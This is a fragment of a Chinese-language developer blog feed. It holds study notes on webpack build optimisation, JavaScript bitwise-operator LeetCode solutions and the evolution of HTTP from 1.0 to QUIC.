class="line">16</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: path.join(__dirname, <span class="string">'src/search.html'</span>), <span class="comment">// 指定模板</span></span><br><span class="line">    filename: <span class="string">'search.html'</span>, <span class="comment">// 打包出来的文件名</span></span><br><span class="line">    chunks: [<span class="string">'search'</span>], <span class="comment">// 使用了哪些entry chunk</span></span><br><span class="line">    inject: <span class="literal">true</span>, <span class="comment">// js, css自动注入到html</span></span><br><span class="line">    minify: &#123;</span><br><span class="line">      html5: <span class="literal">true</span>,</span><br><span class="line">      collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">      preserveLineBreads: <span class="literal">false</span>,</span><br><span class="line">      minifyCSS: <span class="literal">true</span>,</span><br><span class="line">      minifyJS: <span class="literal">true</span>,</span><br><span class="line">      removeComments: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-7-资源内联"><a href="#2-7-资源内联" class="headerlink" title="2.7 资源内联"></a>2.7 资源内联</h4><p><code>raw-loader</code>内联HTML, JS。内联CSS，用style-loader / html-inline-css-webpack-plugin<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$&#123;<span class="built_in">require</span>(<span class="string">'raw-loader!babel-loader!./meta.html'</span>)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$&#123;<span class="built_in">require</span>(<span class="string">'raw-loader!../node-modules/lib-flexible.js'</span>)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-8-暴露全局变量"><a href="#2-8-暴露全局变量" class="headerlink" title="2.8 暴露全局变量"></a>2.8 暴露全局变量</h4><p><br></p><h3 id="3-优化生产配置"><a href="#3-优化生产配置" class="headerlink" title="3. 优化生产配置"></a>3. 优化生产配置</h3><h4 id="3-1-Tree-Shaking"><a href="#3-1-Tree-Shaking" class="headerlink" title="3.1 Tree-Shaking"></a>3.1 Tree-Shaking</h4><p>一个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到bundle里，tree-shaking只把用到的方法打入bundle，没用到的方法会在uglify阶段被擦除。要求必须是ES6的语法</p><p>Webpack默认支持开启tree-shaking，设置<em><code>mode: &#39;production&#39;</code></em>即可。或在.babelrc里设置<em><code>modules: false</code></em>即可。</p><p><br></p><h4 id="3-2-Scope-Hoisting"><a href="#3-2-Scope-Hoisting" class="headerlink" title="3.2 Scope Hoisting"></a>3.2 Scope Hoisting</h4><p>构造后的代码存在大量函数闭包包裹代码，导致体积增大（模块越多越明显）。运行代码时创建的函数作用于变多，内存开销变大。<em><code>Scope Hositing</code></em>译为作用域提升。它将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突。从而减少函数声明代码和内存开销。</p><p>Webpack4设置<em><code>mode: production</code></em>，会默认开启scope hoisting。<br>Webpack3中需要增加<em><code>new webpack.optimize.MouduleConcatenationPlugin()</code></em>。</p><p><br></p><h4 id="3-1-提取公用资源"><a href="#3-1-提取公用资源" class="headerlink" title="3.1 提取公用资源"></a>3.1 提取公用资源</h4><p>提取公共资源<br>CommonSplitChunk</p><p><br></p><h4 id="3-4-代码分离"><a href="#3-4-代码分离" class="headerlink" title="3.4 代码分离"></a>3.4 代码分离</h4><p>把代码分离到不同的bundle中，可以按需加载或并行加载这些文件。常用的代码分离有三种：</p><ul><li>入口起点： 使用<code>entry</code>配置手动地分离代码</li><li>防止重复： 使用<code>SplitChunksPlugin</code>分离chunk</li><li>动态导入： 通过模块中的内联函数调用来分离代码<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    index: <span class="string">'./src/index.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'[name].bundle.js'</span>,</span><br><span class="line">    chunkFilename: <span class="string">'[name].bundle.js'</span>,</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>在React中根据路由做代码分割<br>src/index.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncComponent <span class="keyword">from</span> <span class="string">'./async-component'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到异步组件</span></span><br><span class="line"><span class="keyword">const</span> AsyncDemo = asyncComponent(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./demo'</span>))</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Route path=<span class="string">"/demo"</span> component=&#123;AsyncDemo&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>src/async-component.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;Function&#125; loadComponent e.g: () =&gt; import('./component')</span></span><br><span class="line"><span class="comment"> * @param &#123;ReactNode&#125; placeholder  未加载前的占位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (loadComponent, placeholder = <span class="literal">null</span>) =&gt; &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">AsyncComponent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    unmount = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">      <span class="keyword">super</span>()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        component: <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line">      <span class="keyword">this</span>.unmount = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> componentDidMount() &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;<span class="attr">default</span>: component&#125; = <span class="keyword">await</span> loadComponent()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.unmount) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        component: component</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> C = <span class="keyword">this</span>.state.component</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        C ? <span class="xml"><span class="tag">&lt;<span class="name">C</span> &#123;<span class="attr">...this.props</span>&#125;&gt;</span><span class="tag">&lt;/<span class="name">C</span>&gt;</span></span> : placeholder</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> AsyncComponent</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-加快打包速度"><a href="#4-加快打包速度" class="headerlink" title="4. 加快打包速度"></a>4. 加快打包速度</h3><h4 id="4-1-缓存加快二次构建"><a href="#4-1-缓存加快二次构建" class="headerlink" title="4.1 缓存加快二次构建"></a>4.1 缓存加快二次构建</h4><h4 id="4-2-缩小构建目标"><a href="#4-2-缩小构建目标" class="headerlink" title="4.2 缩小构建目标"></a>4.2 缩小构建目标</h4><p>缩小loader应用范围，限定只在 src 目录下的 js/jsx 文件需要经 babel-loader 处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rules: [ </span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="regexp">/\.jsx?/</span>,</span><br><span class="line">    include: [ </span><br><span class="line">        path.resolve(__dirname, <span class="string">'src'</span>), </span><br><span class="line">    ],</span><br><span class="line">    use: <span class="string">'babel-loader'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><h4 id="4-3-分包：预编译资源"><a href="#4-3-分包：预编译资源" class="headerlink" title="4.3 分包：预编译资源"></a>4.3 分包：预编译资源</h4><h4 id="4-4-多进程并行压缩"><a href="#4-4-多进程并行压缩" class="headerlink" title="4.4 多进程并行压缩"></a>4.4 多进程并行压缩</h4><h4 id="4-5-优化显示日志"><a href="#4-5-优化显示日志" class="headerlink" title="4.5 优化显示日志"></a>4.5 优化显示日志</h4><p><br></p><h3 id="5-实现分包"><a href="#5-实现分包" class="headerlink" title="5. 实现分包"></a>5. 实现分包</h3><p>默认的分包规则：</p><ul><li>同一个 entry 下触达到的模块组织成一个 chunk</li><li>异步模块单独组织为一个 chunk</li><li>entry.runtime 单独组织成一个 chunk</li></ul><p><br></p><h3 id="6-热更新原理"><a href="#6-热更新原理" class="headerlink" title="6. 热更新原理"></a>6. 热更新原理</h3><p>Webpack 的热更新又称热替换（Hot Module Replacement），缩写为 HMR。 这个机制可以做到不用刷新浏览器而将新变更的模块替换掉旧的模块。</p><p>HMR 的核心就是客户端从服务端拉取更新后的文件，准确的说是 chunk diff (chunk 需要更新的部分)。</p><p>实际上 WDS 与浏览器之间维护了一个 Websocket，当本地资源发生变化时，WDS 会向浏览器推送更新，并带上构建时的 hash，让客户端与上一次资源进行对比。客户端对比出差异后会向 WDS 发起 Ajax 请求来获取更改内容 (文件列表、hash)，这样客户端就可以再借助这些信息继续向 WDS 发起 jsonp 请求获取该 chunk 的增量更新。</p><p>后续的部分 (拿到增量更新之后如何处理？哪些状态该保留？哪些又需要更新？) 由 HotModulePlugin 来完成，提供了相关 API 以供开发者针对自身场景进行处理，像 react-hot-loader 和 vue-loader 都是借助这些 API 实现 HMR。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://webpack.docschina.org/guides/code-splitting/" target="_blank" rel="noopener">代码分离</a></li><li><a href="https://www.jianshu.com/p/e3334a2c08e7" target="_blank" rel="noopener">react-router4代码分割</a></li><li><a href="">极客时间-深入浅出Webpack</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>位运算符</title>
      <link href="/2021/09/29/LeetCode-%E4%BD%8D%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2021/09/29/LeetCode-%E4%BD%8D%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      <content type="html"><![CDATA[<hr><h3 id="1-位操作符"><a href="#1-位操作符" class="headerlink" title="1. 位操作符"></a>1. 位操作符</h3><p>位运算符的优先级小于加减运算的优先级<br>操作数只能为整型或字符型数据</p><ul><li><p><em>&amp;</em><br>与，参与运算的两数各对应的二进位相与。只有对应的两个二进位均为1时，结果位才位1，否则为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span> &amp; <span class="number">5</span> = <span class="number">1</span></span><br><span class="line">  <span class="number">00001001</span></span><br><span class="line">&amp; <span class="number">00000101</span></span><br><span class="line">= <span class="number">00000001</span></span><br></pre></td></tr></table></figure></li><li><p><em>|</em><br>或，参与运算的两数各对应的二进位相或。只要对应的两个二进位有一个为1时，结果位就为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span> | <span class="number">5</span> = <span class="number">13</span></span><br><span class="line">  <span class="number">00001001</span></span><br><span class="line">| <span class="number">00000101</span></span><br><span class="line">= <span class="number">00001101</span></span><br></pre></td></tr></table></figure></li><li><p><em>^</em><br>异或，参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span> ^ <span class="number">5</span> = <span class="number">12</span></span><br><span class="line">  <span class="number">00001001</span></span><br><span class="line">^ <span class="number">00000101</span></span><br><span class="line">= <span class="number">00001100</span></span><br></pre></td></tr></table></figure></li><li><p><em>~</em><br>求反，对参与运算的各二进位按位求反</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~<span class="number">1001</span> = <span class="number">0110</span></span><br></pre></td></tr></table></figure></li><li><p><em>&lt;&lt;</em><br>左移运算符，左移n位就是乘以2的n次方。把<code>&lt;&lt;</code>左边的运算数的各二进位全部左移若干位，右<code>&lt;&lt;</code>右边的数指定移动的位数，高位丢弃，低位补0.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &lt;&lt; <span class="number">4</span> = <span class="number">16</span></span><br><span class="line">(<span class="number">-1</span>) &lt;&lt; <span class="number">4</span> = <span class="number">-16</span></span><br></pre></td></tr></table></figure></li><li><p><em>&gt;&gt;</em><br>右移运算符，右移n位就是除以2的n次方。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span> &gt;&gt; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">(<span class="number">-16</span>) &gt;&gt; <span class="number">3</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-leetcode"><a href="#2-leetcode" class="headerlink" title="2. leetcode"></a>2. leetcode</h3><ul><li><h4 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h4><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。你的算法应该具有线性时间复杂度，不使用额外空间来实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 除了某个元素只出现一次以外，其余每个元素均出现两次</span></span><br><span class="line"><span class="comment">// 2 ^ 3 ^ 2 ^ 4 ^ 4 =&gt; 2 ^ 2 ^ 4 ^ 4 ^ 3 =&gt; 3</span></span><br><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">    a ^= nums[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="位1的个数"><a href="#位1的个数" class="headerlink" title="位1的个数"></a>位1的个数</h4><p>输入一个无符号整数，返回其二进制表达式中字位数为1的个数(汉明重量)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入：00000000000000000000000000001011</span></span><br><span class="line"><span class="comment">// 输出：3</span></span><br><span class="line"><span class="keyword">var</span> hammingWeight = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 循环右移，判断二进制最低位数是不是1</span></span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            a++</span><br><span class="line">        &#125;</span><br><span class="line">        n&gt;&gt;=<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h4><p>给定一个整数(32位有符号整数)，请编写一个函数来判断它是否是2的幂次方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPowerOfTwo = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 2的幂一定大于0</span></span><br><span class="line">  <span class="comment">// 2的幂用二进制表示，一定只有一位数用1，n = 000100, n-1 = 000011, n&amp;(n-1) = 000000 =0</span></span><br><span class="line">  <span class="comment">// 非2的幂 n = 001100 , n-1 = 001011, n&amp;(n-1) != 0</span></span><br><span class="line">  <span class="keyword">return</span> (n &gt; <span class="number">0</span>) &amp;&amp; (n &amp; (n - <span class="number">1</span>)) === <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="4的幂"><a href="#4的幂" class="headerlink" title="4的幂"></a>4的幂</h4><p>给定一个整数(32位有符号整数)，请编写一个函数来判断它是否是4的幂次方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPowerOfFour = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (num === <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">while</span> (a !== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (num === a) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a &lt;&lt;= <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="找不同"><a href="#找不同" class="headerlink" title="找不同"></a>找不同</h4><p>给定两个字符串s和t，它们只包含小写字母。字符串t由s随机重排，然后再随机位置添加一个字母。找出在t中被添加的字母。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过text.charCodeAt() 获取字符的unicode编码，sum(t) - sum(s),找到不同的值的编码，</span></span><br><span class="line"><span class="comment">// 通过String.fromCharCode(num)获取字符串</span></span><br><span class="line"><span class="keyword">var</span> findTheDifference = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> total = <span class="number">0</span></span><br><span class="line">    t.split(<span class="string">''</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        total += item.charCodeAt()</span><br><span class="line">    &#125;);</span><br><span class="line">    s.split(<span class="string">''</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        total -= item.charCodeAt()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(total);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将所有字符串异或起来</span></span><br><span class="line"><span class="keyword">var</span> findTheDifference = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> total = <span class="number">0</span></span><br><span class="line">  <span class="keyword">let</span> str = s + t;</span><br><span class="line">  str.split(<span class="string">''</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    total ^= key.charCodeAt();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(total);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="二进制链表转整数"><a href="#二进制链表转整数" class="headerlink" title="二进制链表转整数"></a>二进制链表转整数</h4><p>给你一个单链表的引用结点 head。链表中每个结点的值不是 0 就是 1。已知此链表是一个整数数字的二进制表示形式。请返回该链表所表示数字的 十进制值 。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getDecimalValue = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> total = head.val;</span><br><span class="line">    <span class="keyword">while</span>(head.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">        head = head.next</span><br><span class="line">        total = total * <span class="number">2</span> + head.val</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="实现加法"><a href="#实现加法" class="headerlink" title="实现加法"></a>实现加法</h4><p>不使用运算符<code>+</code>和<code>-</code>，计算两整数a, b之和</p></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5a5886bef265da3e38496fd5" target="_blank" rel="noopener">https://juejin.im/post/5a5886bef265da3e38496fd5</a></li><li><a href="https://www.jianshu.com/p/3d92fe1c34af" target="_blank" rel="noopener">https://www.jianshu.com/p/3d92fe1c34af</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTTP协议进化史</title>
      <link href="/2021/08/24/HTTP-1-0-2-0/"/>
      <url>/2021/08/24/HTTP-1-0-2-0/</url>
      <content type="html"><![CDATA[<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h3><ul><li>对多文件提供良好的支持</li><li>引入状态码</li><li>提供Cache机制，用来缓存已经下载过的数据</li><li>加入User Agent字段，统计客户端基础信息</li></ul><p><br></p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP 1.1"></a>HTTP 1.1</h3><ul><li><code>Keep Alive</code><br>HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段。<br><code>Keep Alive</code>可以在一个TCP连接上传输多个HTTP请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持。</li><li>浏览器对于同一域名，默认允许同时建立6个TCP持久连接</li><li>增加Host字段：使得一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，服务器可以根据<code>Host</code>值做不同的处理。</li><li>增加Content-Length</li><li>引入Cookie机制</li></ul><p><br></p><h3 id="HTTP-1-1-的问题"><a href="#HTTP-1-1-的问题" class="headerlink" title="HTTP 1.1 的问题"></a>HTTP 1.1 的问题</h3><ul><li>TCP的慢启动</li><li>同时开启了多条 TCP 连接，这些连接会竞争固定的带宽</li><li>同一个TCP管道，同一时刻只能处理一个请求</li></ul><p><br></p><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP 2.0"></a>HTTP 2.0</h3><ul><li>多路复用<br>一个域名只使用一个 TCP 长连接来传输数据，但是可以并行请求</li><li>服务器推送<br>HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器</li><li>头部压缩</li></ul><p><br></p><h3 id="HTTP-2-0的问题"><a href="#HTTP-2-0的问题" class="headerlink" title="HTTP 2.0的问题"></a>HTTP 2.0的问题</h3><ul><li>丢包导致的阻塞问题<br>有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。</li></ul><p>在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p><p><br></p><h3 id="HTTP-3-——-QUIC"><a href="#HTTP-3-——-QUIC" class="headerlink" title="HTTP 3 —— QUIC"></a>HTTP 3 —— QUIC</h3><ul><li>实现了类似 TCP 的流量控制、传输可靠性的功能。</li><li>集成了 TLS 加密功能</li><li>实现了 HTTP/2 中的多路复用功能，和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。</li><li>实现快速握手</li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>动态规划</title>
      <link href="/2021/08/23/LeetCode-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2021/08/23/LeetCode-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
